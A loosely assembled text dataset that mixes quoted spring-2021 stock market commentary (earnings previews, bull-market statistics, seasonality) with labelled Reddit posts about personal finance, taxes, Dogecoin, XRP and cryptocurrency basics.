&gt; Utilities was the best performing major S&amp;P sector, gaining 3.7%, followed by materials, up 3.2% and health care, up 2.9%. Technology was up 1%. Financials were up 0.7%, while industrials were up 0.6%.
*****
&gt; Lori Calvasina, head of U.S. equity strategy at RBC, said she is watching the coming week’s earnings for signs of margin pressures from higher commodity prices, supply chain issues and other cost factors.
*****
&gt; “Those big forces that are threatening margins right now don’t really apply to financials. They apply more to industrial companies, the material companies and consumer companies,” she said.
*****
&gt; “I think [sectors] like the industrials will give you color on margins,” Calvasina added. “Margins really are the big question mark going forward. I’m definitely watching and listening to see what companies are going to say about taxes.”
*****
&gt; President Joe Biden has proposed raising corporate taxes to 28% from 21% to help pay for his infrastructure plan.
*****
&gt; While the fate of the tax hike is still not clear, the increase in other costs is apparent. Fuel costs have risen sharply with a 30% rise in oil prices since the beginning of the year. Lumber prices in the futures market are at an all-time high and copper futures are up about 17% year-to-date.
*****
&gt; Calvasina said companies face a headwind and a tailwind.
*****
&gt; “Companies are saying we found new ways to cut costs. When revenues come back, margins are going to explode to the upside,” she said. “Some of the Covid-related costs will come down. Those are some of the positives.”
*****
&gt; But not every company will see those benefits. “We could start to see wage pressures come back. Rising commodity costs — increases in PPI and increases in CPI — those are negatives for margins,” Calvasina said, referring to the producer price and consumer price indexes.
*****
&gt; # Searching for hints of inflation
&gt; Peter Boockvar, chief investment officer at Bleakley Advisory Group, said he is also watching the margin comments carefully for impact on individual stocks, but also for what they broadly say about inflation seeping into the economy.
*****
&gt; “What’s going to be the most interesting thing about earnings are profit margins. Some companies are going to get squeezed because they’re going to see price increases and others aren’t because they can pass it on,” said Boockvar.
*****
&gt; He said he will pay close attention to whether the semiconductor shortage is showing up in tech companies’ earnings. Automakers have already taken a hit and have scaled back production due to the lack of chips.
*****
&gt; The CPI for March showed a pick-up in headline inflation to 2.6% year-over-year. A 9.1% jump in gasoline prices contributed to the gain.
*****
&gt; Some of the gains in inflation this spring are expected to be temporary because of the comparison to very low levels last year when the economy was shutdown.
*****
&gt; Other than earnings, the week should be fairly quiet. Federal Reserve speakers have taken a hiatus and are in a blackout period ahead of the late April meeting.
*****
&gt; “It’s really going to be attention shifting to earnings and the inflation story,” said Boockvar.
*****
&gt; # Economic rebound
&gt; In the past week, economic reports underscored how strong the economic momentum could be in the second quarter. Retail sales for March were up nearly 10%, and jobless claims were the lowest of the recovery.
*****
&gt; There is little data in the week ahead, aside from PMI manufacturing and services data Friday. But the markets will keep a close eye on unemployment figures after Thursday’s report of 576,000 new claims — the lowest level since the early days of the pandemic.
*****
&gt; “The large claims decline suggests that job separation rates may finally be normalizing, a good sign for April payrolls,” note Barclays economists. A surprise 916,000 jobs were added in March, and economists have said they now expect a string of reports showing payrolls are up by 1 million or more.
*****
&gt; However, Stephen Stanley, chief economist at Amherst Pierpont, says it may be too early to read too much into the claims data, and the coming week’s report will be important.
*****
&gt; He said the drop in claims was driven by sharp drops in a number of states, including more than half in California and even larger percentage declines in Kentucky and Virginia.
*****
&gt; “Unfortunately, I have no confidence that these moves won’t be at least partially reversed next week,” he wrote. “Continuing claims in the special pandemic programs continue to seesaw up and down every week, with the latest reading, for the period ended March 27, being a down week.”
*****
&gt; # Watching bonds
&gt; Stock investors will also be watching the bond market, where yields declined in the past week and then reversed. The 10-year Treasury was at 1.59% Friday, after tumbling sharply on Thursday.
*****
&gt; Yields move opposite price, and the 10-year is the most widely watched bond security, as it impacts mortgage rates and other loans.
*****
&gt; “The 10-year will now trade in the 1.50% to 1.75% trading range,” said Boockvar.
*****
&gt; “It’ll break below that if inflation is transitory and it will break above if it’s proven to be otherwise,” he added. “I think we priced in the last inflation stats and then we’ll take into account what the real world is saying, from companies.”

&gt; # Four Reasons The Future Looks Bright For The Bulls

&gt; “I look to the future because that’s where I’m going to spend the rest of my life.” George Burns

&gt; The bull market continues, with the S&amp;P 500 Index now up more than 10% in 2021. With stocks up more than 80% from the March 2020 lows, the reality is a well-deserved break or consolidation could happen at any time. Looking to the future, as George Burns said above, we would be a buyer of any material weakness, as we believe this bull market is alive and well as we’ll discuss more in this blog.

&gt; Here are four bullish stats we’ve found recently that indeed suggest this bull market could still have plenty of life left.

&gt; First, the S&amp;P 500 Index was up just under 6% in the first quarter, an area we’d call the sweet spot. Looking back since 1950, when the S&amp;P 500 was up between 5-10% in the first quarter, the rest of the year (so the final three quarters) gained another 12.4% on average and was higher 86.7% of the time. Compare this to when the S&amp;P 500 was up &gt;10% in the first quarter and the returns drop to 6.5% the rest of the year. Lastly, if the first quarter was negative, then the rest of the year was up only 3%. Sweet spot indeed.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i2.wp.com/lplresearch.com/wp-content/uploads/2021/04/4.14.21-Blog-Chart-2.png?ssl=1))**

&gt; Second, the December Low Indicator has bulls smiling. This was created by Lucien Hooper, a Forbes columnist in the 1970s, and it simply says that if the S&amp;P 500 closes beneath the December low during the first quarter then future weakness could be in the cards. But if this critical level holds, then higher prices could be around the corner.

&gt; As the LPL Chart of the Day shows, stocks held above the December lows in 2021 and this could mean continued higher prices, as the S&amp;P 500 was up more than 18% on average previous years when this level held and incredibly was higher 33 out of 35 years.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i0.wp.com/lplresearch.com/wp-content/uploads/2021/04/4.14.21-Blog-CHart-3.png?ssl=1))**

&gt; Third, the S&amp;P 500 was up nearly 54% in the 12 months ending March 2021, one of the largest yearly gains ever. Looking at previous times that had significant 12-month returns shows the potential for weak returns 1, 3, and 6 months later. This makes sense, as stocks could need some time to catch their breath. The good news? One year later the S&amp;P 500 was higher more than 90% of the time, with only the year after the 1987 crash in the red. “It might seem counterintuitive to most investors, but big rallies like we’ve seen tend to mark the start of bull markets, not the end, so we wouldn’t bet on this bull market ending anytime soon,” explained LPL Financial Chief Market Strategist Ryan Detrick.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i0.wp.com/lplresearch.com/wp-content/uploads/2021/04/4.14.21-Blog-CHart-4.png?ssl=1))**

&gt; Lastly, overall market breadth is extremely strong. Again, this could suggest near-term there could be an exhaustion point, but this isn’t what you see at the end of bull markets, in fact, it tends to usually happen at the start of new bull markets. Currently, more than 95% of the components in the S&amp;P 500 are above their 200-day moving average, a level only seen two other times, in December 2003 and September 2009. Looking back at 2004 and 2010, 2004 saw consolidation a good part of the year, while 2010 had a well-deserved 16% correction after the huge gains off the March 2009 lows. But the key point is after extreme market breadth like we are seeing now, overall higher prices and the bull market lasted for many more years.

&gt; Looking to the future, as George Burns said, we believe it could be a bright one for equity investors, particularly when we consider the return potential for stocks compared to cash and high-quality bonds.

&gt; # B.I.G. Tips - Boom Goes the Retail Sales

&gt; After a lousy report for the month of February when freak weather across the south temporarily shut down several areas of the south, Retail Sales bounced back with a vengeance in March as vaccine rollouts accelerated and stimulus checks were spent.

&gt; The moves higher in Retail Sales over the last few months have been incredible. As shown below, while it took 40 months to make a new high following their pre-Financial Crisis peak, COVID only caused a five-month drought without a new high. From the low in April 2020, Retail Sales have bounced 50%!

&gt; Even more impressive, though, is not only are total Retail Sales above their pre-COVID peak, but they are more than 17% above that peak just 14 months ago. The second chart shows the 14-month rate of change in Retail Sales since 1992. While the post-COVID decline was the steepest on record, the 14-month gain is the highest on record. Ironically, had it not been for COVID and the stimulus it resulted in, there is no way Retail Sales levels would be where they are now.

&gt; # Growth a Market Cap Story

&gt; Last week, we repeatedly noted how there has been rotation back into growth-oriented sectors like Technology and Consumer Discretionary. For example, mega-cap names like Tesla (TSLA), Apple (AAPL), and Amazon (AMZN) have been some of the top performers in the second quarter whereas they were some of the worst performers in Q1. As a result of the strong performance of these names which all have heavy weights in the S&amp;P 500 Growth ETF (IVW), the ETF has undergone some notable price action over the past couple of weeks. At the start of April, IVW finally broke back above its 50-DMA after repeatedly failing to do so throughout March. Last week, that rally continued as the ETF also broke out above its February highs.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://media.bespokepremium.com/uploads/2021/04/041221-IVW.png)**

&gt; That sort of strong technical picture is not true for all growth stocks though. Instead, it is more of a market cap story. The Russell 2,000 Growth ETF (IWO) has been stuck in a downtrend over the past few months with another failed attempt to change that last week. Whereas IVW is extremely overbought (at least two standard deviations above its 50-DMA) as of Friday's close, IWO is trading below its 50-DMA.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://media.bespokepremium.com/uploads/2021/04/041221-IWO.png)**

&gt; In the chart below we show small-cap growth relative to large-cap growth through the ratio of IWO to IVW. Throughout the fall and winter, small-cap growth had been outpacing its large-cap peers as the ratio shot higher. But in mid-February, the ratio peaked and in the past month, it has more sharply pulled back as a rotation into large-cap growth has taken place. In fact, the ratio has fallen over 10% in the past month! As shown in the second chart below, there have not been many times since the two ETFs began trading in 2000 in which the ratio has fallen as sharply in such a span of time. The most recent instance was one year ago during and in the immediate aftermath of the bear market. Before that, it was almost a decade since the next most recent occurrence.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://media.bespokepremium.com/uploads/2021/04/041221-IWO-IVW.png)**
&gt; ###### **([CLICK HERE FOR THE CHART!](https://media.bespokepremium.com/uploads/2021/04/041221-IWO-IVW-1M-Chg.png)**

&gt; With just five prior occurrences, there is not a particularly large sample size for these types of moves, but returns have tended to be strong following past times that the ratio of IWO to IVW has fallen by at least 10 percentage points in a single month. For both ETFs, returns have been stronger than their relative norms over the following weeks and months. Small-cap growth has perhaps performed slightly better on average although that is due to smaller declines following the late 2000 instance. In other words, big outperformance of large-cap growth in the past has been generally good for growth stocks.

&gt; # Sell in May??? Post-Election-Year “Worst Months” Mixed

&gt; Our Seasonal Switching Strategy, which is based upon the “Best Six Months” in conjunction with our MACD Technical Buy and Sell Signal signals, has a solid long-term track record of outperformance with potentially less risk compared to a buy and hold approach. Since 1950, DJIA’s average annual gain has been 8.5%. Over the same time period, DJIA has lost an average 0.7% during the “Worst Six Months,” May through October, and gained an average 8.8% during the “Best Six Months,” November through April.

&gt; In post-election years, the historically worst performing year of the four-year cycle (page 130, STA 2021), the “Worst Months” have not been all that bad with more positive periods than negative, but average gains over the six or four month (NASDAQ’s Worst Months are July-October) period are still paltry. It is also worth noting that the one election year with a double-digit “Worst Months” S&amp;P 500 gain, 1980, was followed by a tough “Worst Months” in 1981 (shaded in light grey in table).

personalfinance,Paid my state tax before receiving my federal tax which out my account in the negative.,"Filed my taxes beginning of March. Federal tax was accept and so was state tax. When filing my taxes, the option to have my state tax paid from federal tax return pops up and I choose that method. 
I still have not received my federal tax but was charged state tax straight from my bank account throwing my back account balance in the negative and charging a overdraft fee. 
What can be done in this situation? I won't be getting paid for another 5 days and under ""wheres my refund"" on the IRS page it still says my federal tax is under review.

dogecoin,"When a pro Capp argument starts with a discussion that treats DOGE as a collectable, rockie trading cards, or antique; remember DOGE was meant to be and is a currency","When the discussion about capping says Doge should be limited (capped):  If the discussion is talking about a commodity, or a collectable this may be true. However, DOGE is and was meant to be a currency; used as a currency. So any discussion regarding value must include its adoption and use as an international currency which has begun. Any discussion must include concepts in fiat currency investments and how they are valuated.  Valuation is based on is use and ability to use. Businesses can internationally do business without the worry of FIAT currency exchange rates. One Doge will always = 1 Doge.  Businesses large and small are hit with huge bank credit card processing fees every time we the consumer use our credit card at their establishment. Doge transactions cost 1 Doge. The consumer gets hit with high interest rates when they use a credit card. Consumers use of debit cards is one of the reasons Banks lowered interest gained in savings accounts so the consumer still has paid a ""hidden"" fee. Transaction of doge cost 1 doge.

personalfinance,Vanguard ETF Investment Suggestions for the Future. Current %75/25 stock/short-term reserves asset mix.,"Hello,

I started investing with Vanguard in 2015 at the age of 30 with ETFs (mainly VOO, with VHT and VDE). I think I have done *OK* with a rate of return of 13% as of today. VDE wasn't always kind to me but instead of selling it off when it was dropping with unrealized gains/losses in the red, I stuck with it and purchased a bunch more VDE stock when it hit bottom in March 2020 and have managed to get my unrealized gains/losses well enough back into the green.

I've been lucky to be able to save my stimulus money so I chose to invest it. It seems to me that the market is rather expensive now, so instead of buying more VOO and VHT I've just been putting the money in the Vanguard Federal Money Market Fund as a holding place until the ""right time"" to buy. I did buy a few shares of VOO and VHT with it when they cost less they do now this year, but I still have about 25% of my total assets in ""short-term reserves"" VFMMF. I realize though that this may not be a good strategy in the long term so I'm trying to figure out where to put that money.

I think most people will be able to tell I'm by no means an experienced or knowledgeable investor and we're talking about total assets less than $35K, so ""small-potatoes."" I feel like keeping that money in VFMMF even with such an expensive market may be a mistake. My aim as an investor is definitely ""long-term"" so *I think* that even if the market is high, on a long enough timeline with this kind of investing it may not matter much? Not sure.

Long story short, any advice or suggestions for this kind of situation would be greatly appreciated. Again, this money is purely for long-term investing so I won't be needing it save any unforeseen serious emergencies. Thanks for any help.",finance
personalfinance,Lumber prices meet interest rates,"TLDR: Is it worth it to wait out high construction prices of a house remodel that has already begun if I possibly can’t afford the total cost?

I live in the Denver, Colorado area where the housing market is hot.  I have been planning an extensive remodel of my house for several years. The plan budget to the architect was $150k. I got several bids for contracting the project around $250k (with 10% contingency built in) and I accepted that it would be higher but my finances (including a HELOC) are thin at that cost. I planned to refinance the entire home once the work is complete. 

I selected a contractor about 1.5 years ago but for several reasons it’s been delayed. The demolition was completed for the main floor about 4 months ago. My contractor has dragged his feet about updating the budget with increasing lumber costs this last year. He is now saying that all his sub’s estimates are coming in higher as well and I am anxious about the overall cost. I have considered asking him to drop his contract fee from 17% because it seems that the increase in lumber and subs don’t reflect more work for him. With the HELOC my max is $300k. 

My questions are:

is it worth further delaying the project to wait for construction prices to come down? Or am I weighing that against potential for rising interest rates to refi in 6 months? 

Is it reasonable to ask the contractor to lower his fee?

Are there other alternatives I should seek? Phased construction, etc?",finance
CryptoCurrency,A Users Guide to Cryptocurrency,"**What is a blockchain?**

It is an “immutable ledger.” Think about it like a book that lives in the sky. Every time something changes, its written down with magic ink, that when dries, never changes. And there are thousands of copies of these books, all getting updated at the same time. If one is ever messed with, the other books would wipe out the problem and replace it with the correct entry.

(Tedtalk – Blockchain Massively simplified)

**What is proof of Work?**

First generation crypto currency worked of the concept of Poof of work. There, it is a race to solve a complicated math puzzle, and perform the block write operation. And as a reward get coin. “Mining.” Mining is slow. Bitcoin can only do 7 transactions a minute.

Can you imagine the line at the store if everyone started using bitcoin to buy gas?

Of the thousands and thousands of machines out there racing to win the next block, only 1 at a time wins. That means the others have literally wasted their energy via compute CPU and GPU cycles. Bitcoin used more energy than Argentina last year.

[https://www.bbc.com/news/technology-56012952](https://www.bbc.com/news/technology-56012952)

**What is proof of Stake?**

Proof of Stake works on different types of newly developed “Consensus” algorithms. Ouroboros protocol, created by IHOK and Cardano, along with a team of PHDs and mathematicians, is the first of its kind. They created a secure “lottery” consensus mechanism to “elect” the next “slot leader” to write the block. Here each Stake pool can get a chance to be elected by winning the lottery. Each Ada coin represents 1 lottery ticket. When you delegate to the pool, you give that pool your ticket, not your coin. If the pool wins, you get the reward along with everyone in the pool, and the operator. Because there is no more complicated math puzzle, and no more computers racing to solve the puzzle, its much much faster, and much much cheaper. Cardano nodes can be run on Raspberry Pi.. A lot of nodes out there run on Solar energy. It’s so good, Ethereum, who is proof of work currently, is moving to this model as part of their ETH 2.0 migration. In efforts to reduce gas fees and energy concerns. Pokodot created its own Consensus algorithm. Called Grandpa. I’m still coming to up speed on that one. Same with ETH 2.0 “validators.”

Each other their own way of doing things. But “gen 3” is not Proof of work.

What you should remember is that for both POW, POS, and others, they are all a means of incentivizing the actual people that run the computers hosting the blockchain code. Without them, there is no “decentralized network of immutable ledgers.” Which is because that’s just fancy talk for machines running our code for free.

**What is Market Cap and coin supply and why should we care?**

Market Capitalization is equal to Price of Coin times Supply of Coin. That is, it. But very important.

BITCOIN has a fixed supply. It is not all mined yet. Not until 2140. But it does have a finite amount, 21 Million.

Here is why you can see a 65K or even 100K bitcoin, but you’ll probably never see a 100 dollar DOGE, or even a 100 Dollar Ada (not soon anyway)

Currently there are 18,684,506 BTC out there at a cost of $61,943.23.

That means, the market cap is $61,943.23 x 18,684,506 = $1,157,378,652,594.38 (1.1T)

Cardano, has a fixed coin supply as well. But it is 45 Billion. There are currently 31,948,309,441. So you see the max is 2500x more. Likewise, with 121B DOGE vs 18M BTC - it’s \~6700X more.

At a price is $1.42 that means the market cap for Cardano is $1.42 X 31,948,309,441 = $45,366,599,406.22 (45B)

DOGE coin, has no supply limit. Currently there are 129,224,158,466 (121B) of them. That’s more than 5 times Bitcoin and they make 10K new coins a minute, forever.

You need 10,000 people a min to keep buying, just to maintain the price. They are literally made to lose value.

You’ll need 135B market cap to reach a 1-dollar DOGE.

129,224,158,466 + ((10,000\*60\*24\*365) = 134,480,158,466 (Supply of DOGE in 1 year from now)134,480,158,466 \* 1 = 134,480,158,466

To give you some reference. Here is the Market cap of some big names.

Visa – 499B

Adobe – 250B

Amazon – 1.7T

It’s very confusing because every coin has their own supply. Their own way of creating coins and at what cadence. Some even “burn” coins. So, know what yours does and how it works.

**How can I “get in early?”**

First. We are all early. You might not have gotten in on the first floor, but we’re only halfway up the stairs to the second flight.

Global wealth is estimated at 1 quadrillion. All the Market Cap in crypto is at 2.22 Trillion. That’s only 0.22% of the world’s wealth.

When looking for “what could be the next big thing” find something with a low market cap, regardless of coin price, that has a strong chance of doing well because of team and tech, the two Ts.

Also ask yourself.

What are these coins use cases?

Who is their target audience for adoption?

Who is funding them?

Who is their team building it?What is their history?

Do they have a good plan?

[https://river.com/learn/how-much-worlds-money-in-bitcoin/#:\~:text=Global%20wealth%20is%20estimated%20at,represents%200.09%25%20of%20global%20wealth](https://river.com/learn/how-much-worlds-money-in-bitcoin/#:~:text=Global%20wealth%20is%20estimated%20at,represents%200.09%25%20of%20global%20wealth).

**What are your goals?**

Crypto is really split into 4 worlds.

Day traders, H.O.D.L.’ers, Whales, and weak hands.

Day traders realize that this market is very volatile, now, and historically. Good ones, can capitalize on quick gains by buying low and selling high, waiting for a dip, then buying back in, and selling high again, cyclically.

Then there are those that “Hold On for Dear Life.” These people tend to find something they really are passionate about, and never sell. They keep buying. If they see their coin dips, below at what they bought it at, and have some extra funds, they buy more, to improve their “dollar cost averaging” (DCA) overall. They only “take profit” buy selling a small portion when price is really high.

Whales, are investors that come in with millions and billions of dollars. They often “test” the market buy either buying or dumping millions and billions in hopes to manipulate the market to their advantage. If you’re reading this, you’re probably not in this category, but you should know they exist and effect this marketplace.

Then there are “weak hands.” Do not pick this one. These people buy high and sell low. They only invest based on emotion, and nothing else. When things start going bad, they panic, and sell at a loss. Its much better to let your coin go to .000000001 cents, and just hold on to it in the hopes of a rally years later, then it is to ever sell at a loss. Never do this. Never.

Each has its own risks and rewards.

Day trading can rack up dollars quick, but you can lose them just as quick. And there are tax implicates with trades. Some unknown, and constantly changing.

HODL, might take years, but if you do, the chance of your Return on Invest improves significantly in crypto.

Pick what works best for you but have a plan.

**What are things to look out for?**

**Do your own research**. There are now more then 4K types of crypto currencies. You can create your own in about 30 minutes with the right free tools.

The mortality rate of new coins is super high this year. Lots of people trying to do Pump and Dumps.

There is nothing in life that goes up for no reason, if it does, it’s a Ponzi scheme.

**What is the difference between storing on an exchange or in a wallet?**

A lot.

First, you must remember what the dream of crypto is really offering.

Its offering a way for us to break away from banks. Forever.

Centralized banks that can print money, is a problem. Blockchain solves this.

But not if the new bank ends up being Binace or Coinbase. In fact, keeping your coin in exchanges puts us all at risk of market manipulation by them.

When a certain 1 person or group owns too many nodes, they can make choices that would benefit them. The attack vector is called a 51% attack or sybil attack.

Today however, you need exchanges to on ramp and off ramp FIAT. FIAT money is government-issued currency that is not backed by a physical commodity, such as gold or silver.

But it will not be like that forever. Chains like ADA and DOT will be interoperable with legacy banks and will eventually cut out exchanges.

Personally, I despise BNB coin and binace. They already take high fees, and now they want the control and the rewards too. Coinbase isn’t much better. Again though, a necessary evil, for now.

But more important than the “dream” is that they can be hacked.

They are a website. Not a blockchain. They hold the keys to your wallet, and let you use them with a weak password and no mfa if you like. Its literally like storing your money in a bank. So know your bank. Good thing, like a bank, SOME, are federally insured up to a certain amount. But some are not, and people have lost millions and billions in the past this way.

Lastly, there is the notification of “passive income” and “interest.”

With POS systems, delegators are incentivized to “stake” their coin by earning interest.

With POW systems, like bitcoin, you’d have to stand up your own machine, configure it, and let it use your energy in your house. With withs like Cardano Ada, and ETH 2.0, you can now pull your coin off the exchange, put it in a wallet, delegate to a pool, and earn interest. All while maintaining full control of your coins.

**What are Smart Contracts? (This one will blow your mind if you are a developer)**

First let us start with what most people say.

“Smart contracts are self-executing contracts with the terms of the agreement between buyer and seller being directly written into lines of code.”

Which is true for sure. It helps build trust and removes the cumbersome third party “trusted agent” like a bank.

But what smart contracts really are is “ANY Code” that can be written to a blockchain and NEVER be changed, forever.

ANY CODE. You can write your own coins and put them into the block. It happens a lot.

Games, sure, put in the chain. Check out CryptoKitties.

In the future ALL business will be blockchain businesses. Every transaction, every process in the building and distribution, will be written to a magic book that can’t be messed with.. Ever..

**What are NFTs?**

NonFungible Tokens are the first versions of Smart contracts. They are essentially images that are written to the block as a token, that can then be stored in a digital wallet with a certain policy retention.

So what’s the big deal? I can upload a gif to the internet today.

The big deal is twofold.

First, you are not uploading anything to the “internet.” That whole thing we call the internet is flawed. Tracked, centralized, monitored, and gated.

What you are doing is creating an EARLY entry, in a book that will never change for the rest of time.

Let us sit and think about that for a second.

De Beers is going to have to get new slogan. “A ~~diamond~~ NFT is forever”

Right now, it is some awful GIF of a dogecoin. But it is not what it is. It is what it represents.

It is the next chapter in Art history. What is created will last longer than the Mona Lisa. Someday you will have blockchain archaeologist that comb though chains.

Plus, taking away the cool factor, they create a place that you can now prove you did it first.

Artist could upload lyrics as an NFT, and later sell them, without the fear their art might be stolen before a contract is in place. People could attach their house deed to a chain, and ever again dispute who owns the land after a conflict.

Besides gaming, NFTs are frequently used to sell a wide range of virtual collectibles, including NBA virtual trading cards, music, digital images, video clips and even virtual real estate in [Decentraland](https://decentraland.org/), a virtual world.

personalfinance,PNC denied me because of Delinquency,"Hello r/personalfinance around this time last year I went on a trip spend like 1k on the entire trip overall. I had the funds available to pay this off in my other Debit card with PNC that I could transfer the funds over to. However then my dad told me that he had to close his business and couldn't pay for my last semester of college and I am unelligble for federal loans. Instead of going to a private loan he told me to take out $3500 from my Credit Card instead, and pay it off over time. This happened around March or April of 2020. So I was negative $4500 on my PNC credit card and I had to pay it off without his help over time. When I was in school I had a shitty part time that barely paid me enough for rent and then I got fired bc of COVID making the business not need employees like me. 

I got myself a job after graduating around June and started paying for it as soon as I could putting half of my paycheck into Rent and the other half into my Credit Card Debt. On January of 2021 I fully paid off all of that $4500 negative that I had on that Credit Card. Then they closed my card and told me its because of delinquency. I reapplied and just got a letter back telling me I wasn't elligible.

CryptoCurrency,"Please stop comparing this bull run to the Dec 2017 - Jan 2018 one. We are in spring 2017 phase and we have months to go, we are not near the top.","A lot of the people that joined in 2017 did so after the biggest pump in early 2017. To these people the bull run of 2017 happened at the end of it and the start of 2018. They missed out on the biggest gains (in % terms) in ETH, XRP, XLM, NEO and so many others which happened from March to June 2017. Some of these people will keep warning about how the top might be close.

Now what you need to realize is that just like these people joined late in the party in 2017, so will most new investors and traders this time around. In the summer or later you will see a big influx of noobs who will drive prices up like they did in late 2017 to Jan 2018. They will miss out on the gains that we are seeing now and have yet to see in many big cap coins. When they see that ETH is $5k or Litecoin is $1K that's when they will join. Just like with Doge they come in after big gains have already been made.

So please stop telling people we are in the same place as December 2017 when you were not around in early 2017.

If the 2013 and 2017 runs which both occurred after a supply decrease due to a halvening in the previous year, both ended at the end of the year, how can you expect a bull run with added institutional money and a halvening last year and crazy FED money printing to end in Spring?",cryptocurrency

I paid off my car last year and it’s valued at $10k. My work does not offer a 401k at this time. 

I value flexibility and available cash on hand. Mostly so I can take a quick vacation or purchase something nice for myself without having to worry about budgeting or saving. 

I want to start creating more personal finance goals, but the typical “next step” for someone in my age group isn’t really what I have in mind. I have no interest in purchasing a home because the market is trash where I live, and even purchasing a condo would put me in debt for a quarter million. I don’t think I’ll have kids for another five years. Long term goal is to purchase 40+ acres of land for a homestead and potentially starting a vineyard/medicinal farm. 

I have an IRA, but haven’t contributed much to it in a couple years due to COVID and other reasons. It looks like I have until mid May to max out my IRA contributions for 2020. Although, I’m a little hesitant because I am unsure whether the market fluctuations will wipe out my hard earned savings. 

Is maxing out 2020 a good idea? Or should I focus on just making out 2021? What other things should I be looking at in personal finance considering my current earnings/savings rate/debt to income ratio? 

I worked hard and grinded away at personal finance goals from 2016-2019 (buying a car, paying it off, building at least $50k in savings, keeping cost of living low) and now I feel like I’ve hit a wall. Any feedback is appreciated.",finance

personalfinance,Tax Question - 1099R,"Do I need to report this income?

I made less than 3k in 2020 while filing as an independent. I did my taxes via free TurboTax in January.  Naturally, I was refunded all the federal and state income tax as my income was so low.  The problem is, after filing I recieved a 1099R for a pension I had forgot about from early 2020; about 400 dollars.  The federal government took 80 of that as income tax.

The free version of TurboTax does not let you make an amendment, so I would have to file one on paper for both state and federal.  All that would happen is that I would get an additional 80 dollars refunded to me since I made so little money. But this seems to honestly be more hassle than its worth. My question is, can I get in trouble for not reporting this income? It seems silly to me that I could, given that I wouldn’t owe anything and it would actually be the government owing me a refund on that.

Can I just forget about this, or is that a risk I should not take?",finance
XRP,How does the success of Ripple actually influence xrp price?,"I bought close to 6000 xrp in mid January of  2018. I paid 2.92$ .  I really believed in it's potential but lost interest in the cypto world when it tanked. I held on to it on my digital wallet and forgot about it. 

Fast forward 3 years later and it's really starting to take off again. I even bought 3000 more last week. I've watched plenty of youtube videos (bearable bull is my fav) but still do not fully understand how Ripple can influence xrp price.

I understand that the federal reserve, the European union and many other huge players are planning on digitizing currencies using the Ripple protocol but as far as I understand they're not going to be using xrp, they're going to use their newly created digital currency. I also understand that this will eventually replace swift transactions because it's cheaper, faster and more efficient. But once again, countries will be using their own Ripple protocol to transfer and exchange currencies at the same time.
 
Can someone kindly shed light on how one affects the other?

Thanks in advance!",cryptocurrency
personalfinance,Befuddled: Need homeowner's insurance on a doublewide that needs work,"So I tried to do this on my own but there's so many factors going into this that I need a bit of advice on the best way to proceed and how to avoid pitfalls.

A month ago I paid cash a doublewide manufactured home on a permanent foundation on an acre of land that I won at auction.  The doublewide needs a lot of work but is salvageable

I'm trying to get a mortgage on it because I pulled from various lines of credit at high interest rates to do a cash purchase (which was required).  The issues are the following:

&amp;#x200B;

1. While I have the deed to the land, I can't find the title for the doublewide.  Dataplate is nowhere to be found.  IBTS I was able to get a number associated with the ""Certificate of performance"" but not sure that's going to work for the DMV.  Though it seems the doublewide has been rolled into property taxes as real property.  
2. The condition of the property.  I haven't even flipped on electric yet so I don't know the status of water pump (on well), hot water heater, hvac.  The roof is shot but I'm in the process of getting estimates to replace it.  I estimate that will be done in 6 weeks or less.  There is an acre of land, too.  Assurant online asked if the house needed more than $500 in repairs and I answered yes and that was the end of that.  A local insurance broker got me up to a monthly quote and ready for the bank ACH and everything and then said they needed to go out and see the property and then they ghosted me.  I guess they saw :)

I want to shop online for homeowners but I'm concerned I will be asked a ""kill"" question or will be referred to a local agent who will want to come out to the property.  I realize they don't want to insure a property that needs a lot of work but things are in process.

Gut check says that despite dealing with higher interest rates some things are going to have be brought under control first, and they will be, because I intend to live in the property, it's not a flip.  I would wager the main things are: getting the roof replaced, fixing all utilities and hvac and addressing any issues with outbuildings or the yard.  Also getting the titling issues settled.  That's all looking like 6 months (of high interest in the meantime).

Having said that, I'd like to go with an insurance company online that asks minimal questions and just gets me a quote and a policy, even if it's a higher one, so I can get insured and mortgaged so I have more liquidity.

For people with some experience with insurance and/or manufactured homes would be interested in getting some perspective on this.  

Thanks",finance

personalfinance,Multiple Co-workers and I have received Audits from the IRS.,"Its a strange story. But I'll just summarize. I got a job at a roofing company as a sales canvasser along with 2 other people. I was hired in June 2020 and theyve been there since January 2020. We were all classified as Employees and not Contract workers, so none of us ever filled out a 1099 ONLY our w4's when we got hired. I filled out everything correctly , including the info that I get State taxes taken out every weekly paycheck along with Fed etc. Commission was revived when a sale was closed, and for random reasons boss would throw us extra 100$. Well fast forward to tax time 2021 and it took till February for any of us to receive our w2's after I asked about it multiple times. I open the paper and I see that ZERO state has been taken out ALL YEAR. I ask and they say they'll "" ask their tax guy"" about it. But I dont think they even have a ""tax guy"". I leave and call my co workers and theyve told me they QUIT because they also noticed the same issue with their w2's as well. Before I even got my w2 I noticed on my pay stubs it never said anything about state taxes. I tried to call, text, or catch my boss at the office but every time NO ONE could give me an answer !! So I figured all I could do was file my taxes and my income was only 9,000$. Then a few days later received mail about being audited. And so did my co-workers. I'm asking y'all cause I'm still waiting on the IRS and am getting very antsy. 

Thanks for reading 😸

Edit: Thanks everyone for replying to me even though it was a little difficult to understand what I was talking about haha. I do appreciate it. I gotta wait another few weeks for the IRS to call, so hopefully I'll get my federal return soon.",finance

dogecoin,"Dogecoin is a movement, its not a get rich scheme.","After last few days, We have steadily seen a massive incoming traffic here in the community. And first of all we whole heartedly welcome you all. Here is a little bit of Idea that I am willing to share here, Yes Dogecoin was started as a joke but, now its a movement and not a get rich quick scheme. 

1) Does it have a future and potential? 
- Yes, it has both as long as masses are willing to adopt it as a legit currency, and after Dogecoin stayed well over 0.25 cents in last few days while the whole crypto market was going down does emphasize the same. 

2) Is it too late to buy? 
- No, its never too late to start your own investment 

3) How much should I buy? 
- Depends upon what you can afford to loose. 

4) Does this going to moon? 
- As, I said earlier as long as more and more people are willing to use it in routine life it will surely go up. 

5) Where do I buy it? 
- Where ever you buy but try to avoid robinhood, as you never own a single coin there plus unlike stock crypto is not protected. 

6) Why do people on other forms hate Dogecoin and say it has no hard cap? 
